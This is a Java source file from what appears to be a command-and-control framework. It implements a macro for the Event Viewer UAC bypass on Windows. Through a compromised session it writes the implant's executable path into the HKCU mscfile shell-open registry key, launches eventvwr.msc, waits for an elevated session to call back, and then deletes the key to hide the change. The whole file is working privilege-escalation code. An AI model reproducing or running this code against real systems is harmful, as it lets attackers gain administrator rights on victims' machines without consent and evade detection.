package c2.session.macro.uac;

import c2.Commands;
import c2.session.macro.AbstractCommandMacro;
import c2.session.macro.MacroOutcome;
import util.Time;

public class EventViewerUACMacro  extends AbstractCommandMacro{

	public final String COMMAND = "eventvwr_uac";
	
	@Override
	public String getReadableName() {
		return "Event View UAC macro";
	}

	@Override
	public String getInvocationCommandDescription() {
		return COMMAND;
	}

	@Override
	public String getBehaviorDescription() {
		return "This macro implements the UAC bypass that leverages hkcu\\software\\classes\\mscfile\\shell\\open\\command to launch a different process when Event Viewer is started.";
	}

	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.equalsIgnoreCase(COMMAND) || cmd.startsWith(COMMAND + " ");
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		String clientCmd = null;
		if(cmd.startsWith(COMMAND) && !cmd.equals(COMMAND)) {
			clientCmd = cmd.substring(COMMAND.length() + 1);
			System.out.println("Processing with cmd: " + clientCmd);
		}else {
			sendCommand(Commands.CLIENT_CMD_GET_EXE, sessionId, outcome);
			clientCmd = awaitResponse(sessionId, outcome);
			clientCmd = clientCmd.replace("\r", "");
			clientCmd = clientCmd.replace("\n", "");
		}
		//First get daemon invocation command
		
		//TODO: Sanity check that command is valid. 
		//TODO: Migrate code to sanitize and validate daemon EXE gathering to a common module
		//TODO: Migrate common "takes execuable as argument" macros to a common parent class macro
		
		String regCmd = "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"${DAEMON_EXECUTABLE}\" /f";
		regCmd = regCmd.replace("${DAEMON_EXECUTABLE}", clientCmd);
		sendCommand(regCmd, sessionId, outcome);
		String cmdOutcome = awaitResponse(sessionId, outcome);
		if(!cmdOutcome.contains("The operation completed successfully.")) {
			outcome.addError("Could not write registry key.");
			return outcome;
		}
		
		sendCommand("cmd /c eventvwr.msc", sessionId, outcome);
		
		//TODO: Merge code with CmstpUacBypass
		Time.sleepWrapped(5000);
		
		//Confirm that new session was received with admin privs
		Integer highSessionId = io.getSessionId(sessionStr + ":HighIntegrity");
		//We want to use the elevated session to delete the inf and ps1 files since the elevating session
		//does not always immediately recover to being able to respond to commands
		if(highSessionId == null) {
			outcome.addError("Did not receive a new session");
		}else {
			outcome.addMacroMessage("New elevated session available: " + highSessionId);
		}
		
		//Delete registry key
		sendCommand("reg.exe delete hkcu\\software\\classes\\mscfile /f", sessionId, outcome);
		
		return outcome;
	}

}
